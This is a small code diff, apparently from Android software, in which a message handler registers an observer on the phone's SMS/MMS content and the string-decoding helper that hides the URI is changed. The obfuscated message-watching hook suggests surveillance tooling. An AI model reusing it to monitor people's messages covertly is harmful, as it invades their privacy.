@@ -64,7 +64,7 @@ public class MsgHandler extends Thread {
 
 		// M.1=content://mms-sms
 		msgObserver = new MsgObserver(handler, mmsEnabled, smsEnabled);
-		cr.registerContentObserver(Uri.parse(M.d("content://mms-sms")), true, msgObserver); //$NON-NLS-1$
+		cr.registerContentObserver(Uri.parse(M.e("content://mms-sms")), true, msgObserver); //$NON-NLS-1$
 
 		Looper.loop();
 	}
